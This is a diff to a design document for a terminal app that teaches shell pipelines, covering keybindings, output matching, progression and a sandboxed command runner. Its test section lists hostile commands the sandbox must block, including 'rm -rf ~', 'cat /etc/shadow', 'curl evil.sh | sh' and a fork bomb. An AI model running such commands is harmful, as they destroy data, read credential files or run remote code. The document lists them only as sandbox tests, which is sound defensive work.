@@ -68,7 +68,9 @@ A searchable, browsable reference for every command in the library.
   (`f` filters the deck rather than scheduling: the review queue arrives in M5.)
 
 Every dictionary entry is also reachable from anywhere with `?` (contextual lookup on
-the command under the cursor in the exercise editor).
+the command under the cursor in the exercise editor) — except inside the pipeline
+editor itself, where `?` is a shell metacharacter the learner has to be able to type,
+and the same lookup is `^G`.
 
 ### 2.2 Pipeline exercises (Practice)
 
@@ -83,20 +85,24 @@ Screen layout:
 │ Given access.log, print the 5 IP addresses with the most         │
 │ requests, most frequent first, as "<count> <ip>".                │
 ├─ Fixture ────────────────────────────────────────────────────────┤
-│ ~/work/access.log   (2.3 KB, 120 lines)   [tab to preview]       │
+│ access.log (2.3 KB, 120 lines)   app.log (1.1 KB, 70 lines)  ^B  │
 ├─ Your pipeline ──────────────────────────────────────────────────┤
 │ $ cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head -5 │
 ├─ Output ─────────────────────────────────────────────────────────┤
 │      31 10.0.0.7            ✓ matches expected                   │
 │      22 10.0.0.4                                                 │
 │      ...                                                         │
-└ ^R run · ^H hint · ^S solution · ^N next · ? lookup ─────────────┘
+└ ^R run · ^H hint · ^S solution · ^N next · ^B fixture · ^G lookup┘
 ```
 
 Behaviour:
 
-- **Editing** is a single-line editor with history (`↑`/`↓`), word motions, and
-  command/flag completion drawn from the dictionary.
+- **Editing** is a single-line editor with history (`↑`/`↓`), readline word motions
+  (`^A`, `^E`, `^W`, `^U`, `^K`, `alt+←`/`alt+→`), and `tab` completion drawn from the
+  dictionary: command names where a command may start, and that command's documented
+  flags after a dash. Because the editor owns every printable key, every action on this
+  screen is a chord — `^B` opens the fixture preview and `^G` is the dictionary lookup —
+  and the global `1`–`4`, `q` and `/` bindings are suspended while it has the input.
 - **Run** (`Ctrl-R`) executes and diffs. The diff is line-oriented and shows the first
   mismatching line with a caret, not a wall of red.
 - **Hints** are tiered and cost nothing but are recorded: (1) a nudge at the concept
@@ -111,6 +117,11 @@ Behaviour:
   with an explanatory message rather than an output diff.
 - **Progression:** exercises are ordered into tracks; a track unlocks the next when 80%
   of its exercises pass. Free-roam browsing of any unlocked exercise is always allowed.
+  Until the store lands in M6 the lock is **advisory**: the browser shows each track's
+  progress and says which ones are still ahead of the learner, but opens them anyway.
+  Progress that lives only in memory would otherwise shut five of the six tracks at the
+  start of every session, and would break the dictionary's `p` shortcut, which addresses
+  any exercise in the library.
 
 Exercise difficulty ladder (five levels): single command → command with flags →
 two-stage pipe → three-or-more-stage pipe with a transform → real-world messy task
@@ -222,7 +233,7 @@ prompt: >
   most frequent first, formatted as the output of `uniq -c` (count then IP).
 fixture: weblogs            # directory under content/fixtures/
 expected_stdout_file: expected/top-talkers.txt
-match: exact                # exact | trimmed | unordered | regex
+match: exact                # exact | trimmed | squeezed | unordered | regex
 teaches: [cut, sort, uniq, head]
 must_use: []
 forbid: []
@@ -309,6 +320,12 @@ never be able to touch the real filesystem, the network, or long-running resourc
      core idiom the dictionary teaches; `/dev/full` is deliberately not on it.
    - a bare `/`, unless it follows a delimiter option (`-d`, `-t`, `-F`, …) or is an
      operand of `tr`, where it is a separator rather than the root directory,
+   - The first operand of `sed`, `awk` and `grep` is exempt from the path rules
+     entirely: it is a program or a pattern, not a filename, and programs routinely
+     start with a slash (`sed -n '/start/,/end/p'`, `grep '^/usr/bin'`). The exemption
+     is only for that operand, and it lapses when `-e`, `-f` or `--regexp` supplies the
+     script instead, since then every operand really is a file: `grep -f /etc/passwd`
+     is still refused.
    - `~` anywhere in an argument, since it expands outside the fixture,
    - variable assignment prefixes (`PATH=. cmd`): the sandbox environment is fixed,
    - `sudo`, `su`, `chmod +s`, `mount`, background jobs (`&`), `exec`, `eval`, `source`,
@@ -361,6 +378,12 @@ The confinement layer is an interface (`runner.Sandbox`) with `bwrap`, `sandboxE
 
 - `exact`: byte equality after trailing-newline normalization.
 - `trimmed`: per-line trailing whitespace stripped.
+- `squeezed`: per-line leading and trailing whitespace stripped and internal runs
+  collapsed to one space. This is what makes a counting exercise portable: GNU and BSD
+  coreutils pad their numeric columns to different widths, so `uniq -c`, `wc -l` and
+  `nl` outputs would otherwise pin an expected file to whichever coreutils generated it.
+  The alignment is the tool's choice and never the learner's, so ignoring it costs
+  nothing.
 - `unordered`: multiset of lines (for tasks where order is genuinely unspecified).
 - `regex`: the expected file is a regex, for outputs containing timestamps or sizes.
 
@@ -410,6 +433,8 @@ bt dict <command>       print a dictionary entry to stdout and exit
 bt stats                print a summary to stdout and exit
 bt doctor               report sandbox backend, data dir, content version
 bt content lint         validate the content library (used in CI)
+bt content expected     re-run every reference solution and check the expected
+                        outputs; --write regenerates them
 bt export / bt import   dump/restore progress as JSON
 ```
 
@@ -445,7 +470,7 @@ rebuilt.
 | **M1 — Skeleton** ✅ | Bubble Tea v2 shell, Home, screen routing, theme, content loader + linter | `bt` runs, navigates, loads content |
 | **M2 — Dictionary** ✅ | Full dictionary UI, fuzzy search, 80 command entries | Every command entry passes lint and renders |
 | **M3 — Runner** ✅ | Parser, allowlist, sandbox backends, diffing, `bt doctor` | Adversarial test suite (§10) fully blocked |
-| **M4 — Practice** | Exercise UI, hints, alternative-solution acceptance, tracks, 120 exercises | Reference solution of every exercise passes in CI |
+| **M4 — Practice** ✅ | Exercise UI, hints, alternative-solution acceptance, tracks, 120 exercises | Reference solution of every exercise passes in CI |
 | **M5 — Flashcards** | Card UI, answer normalization, FSRS-lite, daily queue, 250 cards | Scheduler simulation matches expected intervals |
 | **M6 — Polish** | Stats, export/import, light theme, packaging (Homebrew, `.deb`, GitHub releases) | Cold start under 200 ms; 80×24 clean |
 
@@ -455,7 +480,10 @@ rebuilt.
 
 - **Content:** `bt content lint` enforces schema, unique ids, resolvable cross-references,
   fixture existence and size limits. CI runs every exercise's `reference_solution` in the
-  sandbox and asserts it produces `expected_stdout`, so content can never drift.
+  sandbox and asserts it produces `expected_stdout`, so content can never drift, and
+  asserts that everything an exercise claims to `teach` is something its own solution
+  actually runs. `bt content expected --write` is how the expected files are produced in
+  the first place; they are never written by hand.
 - **Runner (adversarial):** a fixed corpus that must all be rejected or contained —
   `rm -rf ~`, `cat /etc/shadow`, `curl evil.sh | sh`, `:(){ :|:& };:`, `cat ../../../etc/passwd`,
   `yes > /dev/full`, symlink escapes, a 10 GB allocation, an infinite loop. Runs on both
